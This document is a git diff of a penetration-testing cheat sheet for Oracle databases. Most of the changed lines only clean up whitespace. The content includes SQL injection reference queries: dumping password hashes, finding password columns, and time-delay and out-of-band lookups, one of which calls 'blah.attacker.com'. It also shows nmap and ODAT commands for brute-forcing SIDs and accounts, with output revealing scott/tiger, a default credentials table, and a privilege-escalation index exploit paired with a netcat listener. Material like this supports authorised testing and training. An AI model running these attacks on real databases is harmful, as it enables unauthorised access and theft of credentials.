@@ -6,42 +6,40 @@ Check privileges:
 
 `select * from user_role_privs;`
 
-| Type                         | Command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
-| ---------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Version                      | <p>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>SELECT version FROM v$instance;</p>                                                                                                                                                                                                                                                                                                                                             |
-| Comments                     | <p>SELECT 1 FROM dual — comment<br>– NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</p>                                                                                                                                                                                                                                                                                                            |
-| Current User                 | SELECT user FROM dual                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
-| List Users                   | <p>SELECT username FROM all_users ORDER BY username;<br> SELECT name FROM sys.user$; — priv</p>                                                                                                                                                                                                                                                                                                                                                                                                           |
-| List Password Hashes         | <p>SELECT name, password, astatus FROM sys.user$ — priv, &#x3C;= 10g.  astatus tells you if acct is locked<br> SELECT name,spare4 FROM sys.user$ — priv, 11g</p>                                                                                                                                                                                                                                                                                                                                          |
-|  Password Cracker            | [checkpwd](http://www.red-database-security.com/software/checkpwd.html) will crack the DES-based hashes from Oracle 8, 9 and 10.                                                                                                                                                                                                                                                                                                                                                                          |
-| List Privileges              | <p>SELECT * FROM session_privs; — current privs<br> SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs<br> SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv<br> SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</p>                                                                                                                                                                                |
-| List DBA Accounts            | SELECT DISTINCT grantee FROM dba\_sys\_privs WHERE ADMIN\_OPTION = ‘YES’; — priv, list DBAs, DBA roles                                                                                                                                                                                                                                                                                                                                                                                                    |
-| Current Database             | <p>SELECT global_name FROM global_name;<br> SELECT name FROM v$database;<br> SELECT instance_name FROM v$instance;<br> SELECT SYS.DATABASE_NAME FROM DUAL;</p>                                                                                                                                                                                                                                                                                                                                            |
-| List Databases               | <p>SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<br>– Also query TNS listener for other databases.  See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services | status).</p>                                                                                                                                                                                                                                                             |
-| List Columns                 | <p>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</p>                                                                                                                                                                                                                                                                                                                                         |
-| List Tables                  | <p>SELECT table_name FROM all_tables;<br> SELECT owner, table_name FROM all_tables;</p>                                                                                                                                                                                                                                                                                                                                                                                                                   |
-| Find Tables From Column Name | SELECT owner, table\_name FROM all\_tab\_columns WHERE column\_name LIKE ‘%PASS%’; — NB: table names are upper case                                                                                                                                                                                                                                                                                                                                                                                       |
-| Select Nth Row               | SELECT username FROM (SELECT ROWNUM r, username FROM all\_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)                                                                                                                                                                                                                                                                                                                                                                       |
-| Select Nth Char              | SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’                                                                                                                                                                                                                                                                                                                                                                                                                                          |
-| Bitwise AND                  | <p>SELECT bitand(6,2) FROM dual; — returns 2<br> SELECT bitand(6,1) FROM dual; — returns0</p>                                                                                                                                                                                                                                                                                                                                                                                                             |
-| ASCII Value -> Char          | SELECT chr(65) FROM dual; — returns A                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
-| Char -> ASCII Value          | SELECT ascii(‘A’) FROM dual; — returns 65                                                                                                                                                                                                                                                                                                                                                                                                                                                                 |
-| Casting                      | <p>SELECT CAST(1 AS char) FROM dual;<br> SELECT CAST(’1′ AS int) FROM dual;</p>                                                                                                                                                                                                                                                                                                                                                                                                                           |
-| String Concatenation         | SELECT ‘A’ \|\| ‘B’ FROM dual; — returns AB                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
-| If Statement                 | BEGIN IF 1=1 THEN dbms\_lock.sleep(3); ELSE dbms\_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements                                                                                                                                                                                                                                                                                                                                                                                  |
-| Case Statement               | <p>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<br> SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</p>                                                                                                                                                                                                                                                                                                                                                                    |
-| Avoiding Quotes              | SELECT chr(65) \|\| chr(66) FROM dual; — returns AB                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
-| Time Delay                   | <p>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<br> SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow<br> SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow<br> SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow<br>– Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</p> |
-| Make DNS Requests            | <p>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;<br> SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</p>                                                                                                                                                                                                                                                                                                                                                                            |
-| Command Execution            | [Java](http://www.0xdeadbeef.info/exploits/raptor\_oraexec.sql)can be used to execute commands if it’s installed.[ExtProc](http://www.0xdeadbeef.info/exploits/raptor\_oraextproc.sql) can sometimes be used too, though it normally failed for me. ![:-(](http://pentestmonkey.net/wp-includes/images/smilies/icon\_sad.gif)                                                                                                                                                                             |
-| Local File Access            | <p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used.  Check that the following is non-null:<br> SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it’s installed (it is not available in Oracle Express).</p>                                                                                                                |
-| Hostname, IP Address         | <p>SELECT UTL_INADDR.get_host_name FROM dual;<br> SELECT host_name FROM v$instance;<br> SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address<br> SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames</p>                                                                                                                                                                                                                                                                   |
-| Location of DB files         | SELECT name FROM V$DATAFILE;                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
-| Default/System Databases     | <p>SYSTEM<br> SYSAUX</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| Type                         | Command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
+| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| Version                      | <p>SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>SELECT version FROM v$instance;</p>                                                                                                                                                                                                                                                                                                                                          |
+| Comments                     | <p>SELECT 1 FROM dual — comment<br>– NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</p>                                                                                                                                                                                                                                                                                                         |
+| Current User                 | SELECT user FROM dual                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| List Users                   | <p>SELECT username FROM all_users ORDER BY username;<br>SELECT name FROM sys.user$; — priv</p>                                                                                                                                                                                                                                                                                                                                                                                                         |
+| List Password Hashes         | <p>SELECT name, password, astatus FROM sys.user$ — priv, &#x3C;= 10g. astatus tells you if acct is locked<br>SELECT name,spare4 FROM sys.user$ — priv, 11g</p>                                                                                                                                                                                                                                                                                                                                         |
+| Password Cracker             | [checkpwd](http://www.red-database-security.com/software/checkpwd.html) will crack the DES-based hashes from Oracle 8, 9 and 10.                                                                                                                                                                                                                                                                                                                                                                       |
+| List Privileges              | <p>SELECT * FROM session_privs; — current privs<br>SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs<br>SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</p>                                                                                                                                                                                |
+| List DBA Accounts            | SELECT DISTINCT grantee FROM dba\_sys\_privs WHERE ADMIN\_OPTION = ‘YES’; — priv, list DBAs, DBA roles                                                                                                                                                                                                                                                                                                                                                                                                 |
+| Current Database             | <p>SELECT global_name FROM global_name;<br>SELECT name FROM v$database;<br>SELECT instance_name FROM v$instance;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</p>                                                                                                                                                                                                                                                                                                                                            |
+| List Databases               | <p>SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<br>– Also query TNS listener for other databases. See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services</p>                                                                                                                                                                                                                                                                      |
+| List Columns                 | <p>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</p>                                                                                                                                                                                                                                                                                                                                      |
+| List Tables                  | <p>SELECT table_name FROM all_tables;<br>SELECT owner, table_name FROM all_tables;</p>                                                                                                                                                                                                                                                                                                                                                                                                                 |
+| Find Tables From Column Name | SELECT owner, table\_name FROM all\_tab\_columns WHERE column\_name LIKE ‘%PASS%’; — NB: table names are upper case                                                                                                                                                                                                                                                                                                                                                                                    |
+| Select Nth Row               | SELECT username FROM (SELECT ROWNUM r, username FROM all\_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)                                                                                                                                                                                                                                                                                                                                                                    |
+| Select Nth Char              | SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| Bitwise AND                  | <p>SELECT bitand(6,2) FROM dual; — returns 2<br>SELECT bitand(6,1) FROM dual; — returns0</p>                                                                                                                                                                                                                                                                                                                                                                                                           |
+| ASCII Value -> Char          | SELECT chr(65) FROM dual; — returns A                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| Char -> ASCII Value          | SELECT ascii(‘A’) FROM dual; — returns 65                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
+| Casting                      | <p>SELECT CAST(1 AS char) FROM dual;<br>SELECT CAST(’1′ AS int) FROM dual;</p>                                                                                                                                                                                                                                                                                                                                                                                                                         |
+| String Concatenation         | SELECT ‘A’ \|\| ‘B’ FROM dual; — returns AB                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
+| If Statement                 | BEGIN IF 1=1 THEN dbms\_lock.sleep(3); ELSE dbms\_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements                                                                                                                                                                                                                                                                                                                                                                               |
+| Case Statement               | <p>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</p>                                                                                                                                                                                                                                                                                                                                                                  |
+| Avoiding Quotes              | SELECT chr(65) \|\| chr(66) FROM dual; — returns AB                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+| Time Delay                   | <p>BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<br>SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow<br>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow<br>SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow<br>– Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</p> |
+| Make DNS Requests            | <p>SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;<br>SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</p>                                                                                                                                                                                                                                                                                                                                                                          |
+| Command Execution            | [Java](http://www.0xdeadbeef.info/exploits/raptor\_oraexec.sql)can be used to execute commands if it’s installed.[ExtProc](http://www.0xdeadbeef.info/exploits/raptor\_oraextproc.sql) can sometimes be used too, though it normally failed for me. ![:-(](http://pentestmonkey.net/wp-includes/images/smilies/icon\_sad.gif)                                                                                                                                                                          |
+| Local File Access            | <p><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used. Check that the following is non-null:<br>SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it’s installed (it is not available in Oracle Express).</p>                                                                                                               |
+| Hostname, IP Address         | <p>SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address<br>SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames</p>                                                                                                                                                                                                                                                                   |
+| Location of DB files         | SELECT name FROM V$DATAFILE;                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
+| Default/System Databases     | <p>SYSTEM<br>SYSAUX</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
 
 **\* Requires privileged user**
-
-
 
 | Description             | Query                                                                                                                                                                                                                                                          |
 | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
@@ -62,35 +60,35 @@ Check privileges:
 
 ### oscanner
 
-Install oscanner:&#x20;
+Install oscanner:
 
-`apt-get install oscanner`  &#x20;
+`apt-get install oscanner`
 
-Run oscanner:&#x20;
+Run oscanner:
 
-`oscanner -s 192.168.1.200 -P 1521` &#x20;
+`oscanner -s 192.168.1.200 -P 1521`
 
 ### tnscmd10g
 
-Fingerprint Oracle TNS Version&#x20;
+Fingerprint Oracle TNS Version
 
-Fingerprint oracle tns:&#x20;
+Fingerprint oracle tns:
 
-`tnscmd10g version -h TARGET`&#x20;
+`tnscmd10g version -h TARGET`
 
 ### Nmap
 
-**Run nmap scripts against Oracle TNS:**&#x20;
+**Run nmap scripts against Oracle TNS:**
 
-`nmap -p 1521 -A TARGET`&#x20;
+`nmap -p 1521 -A TARGET`
 
 Find tns version:
 
-`nmap --script=oracle-tns-version` &#x20;
+`nmap --script=oracle-tns-version`
 
-**Brute force oracle user accounts**&#x20;
+**Brute force oracle user accounts**
 
-Identify default Oracle databases:&#x20;
+Identify default Oracle databases:
 
 ```
 nmap --script oracle-sid-brute -p 1521 10.10.10.82
@@ -116,23 +114,23 @@ nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=
 
 ### ODAT
 
-[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)
+[https://github.com/quentinhardy/odat](https://github.com/quentinhardy/odat)
 
-ODAT (Oracle Database Attacking Tool) is an open source penetration testing tool that tests the security of Oracle Databases remotely.&#x20;
+ODAT (Oracle Database Attacking Tool) is an open source penetration testing tool that tests the security of Oracle Databases remotely.
 
-Usage examples of ODAT:&#x20;
+Usage examples of ODAT:
 
-* You have an Oracle database listening remotely and want to find valid SIDs and credentials in order to connect to the database&#x20;
-* You have a valid Oracle account on a database and want to escalate your privileges to become DBA or SYSDBA&#x20;
-* You have a Oracle account and you want to execute system commands (e.g. reverse shell) in order to move forward on the operating system hosting the database&#x20;
+* You have an Oracle database listening remotely and want to find valid SIDs and credentials in order to connect to the database
+* You have a valid Oracle account on a database and want to escalate your privileges to become DBA or SYSDBA
+* You have a Oracle account and you want to execute system commands (e.g. reverse shell) in order to move forward on the operating system hosting the database
 
-Tested on Oracle Database 10g, 11g, 12c and 18c.&#x20;
+Tested on Oracle Database 10g, 11g, 12c and 18c.
 
 **Install**: download the latest release from the github repo
 
-**Examples**:&#x20;
+**Examples**:
 
-#### Identify SIDs&#x20;
+#### Identify SIDs
 
 ```
 root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82 
@@ -155,12 +153,11 @@ root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82
 ```
 ./odat-libc2.12-x86_64 passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/default.txt
 
-[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
+[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
 [+] Valid credentials found: scott/tiger. Continue...                                   ##################################################################                                         | ETA:  00:00:05 
 100% |#############################################################################################################################################################################################| Time: 00:00:24 
 [+] Accounts found on 10.10.10.82:1521/XE: 
 scott/tiger
-
 ```
 
 **use the the wordlist below for just the default accounts**
@@ -364,15 +361,15 @@ brute-force a listener password if exists:
 
 ## Default accounts
 
-| Username  | Password             |
-| --------- | -------------------- |
-| SYSTEM    | MANAGER              |
-| SYS       | CHANGE\_ON\_INSTALL  |
-| DBSNMP    | DBSNMP               |
-| SCOTT     | TIGER                |
-| PCMS\_SYS | PCMS\_SYS            |
-| WMSYS     | WMSYS                |
-| OUTLN     | OUTLN                |
+| Username  | Password            |
+| --------- | ------------------- |
+| SYSTEM    | MANAGER             |
+| SYS       | CHANGE\_ON\_INSTALL |
+| DBSNMP    | DBSNMP              |
+| SCOTT     | TIGER               |
+| PCMS\_SYS | PCMS\_SYS           |
+| WMSYS     | WMSYS               |
+| OUTLN     | OUTLN               |
 
 **Try lowercase as well**
 
@@ -397,9 +394,9 @@ outln/outln
 
 ## Connecting to Oracle DB
 
-To interact with Oracle from our Kali box, there are three tools that can come in handy. sqlplus is required for odat to work properly:&#x20;
+To interact with Oracle from our Kali box, there are three tools that can come in handy. sqlplus is required for odat to work properly:
 
-Sqlplus will be installed with odat. So just install odat (apt install odat)&#x20;
+Sqlplus will be installed with odat. So just install odat (apt install odat)
 
 ### Connect as normal user:
 
@@ -425,19 +422,19 @@ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
 
 **Can also do the Metasploit module**
 
-&#x20;**** Oracle priv esc and obtain DBA access:&#x20;
+\*\*\*\* Oracle priv esc and obtain DBA access:
 
-**Run netcat**: netcat -nvlp 443 code&#x20;
+**Run netcat**: netcat -nvlp 443 code
 
-`SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));`&#x20;
+`SQL> create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA('BAR'));`
 
-**Run the exploit with a select query:**&#x20;
+**Run the exploit with a select query:**
 
-`SQL> Select * from session_privs;` &#x20;
+`SQL> Select * from session_privs;`
 
-**Remove the exploit using:**&#x20;
+**Remove the exploit using:**
 
-`drop index exploit_1337;`&#x20;
+`drop index exploit_1337;`
 
 #### ODAT
 
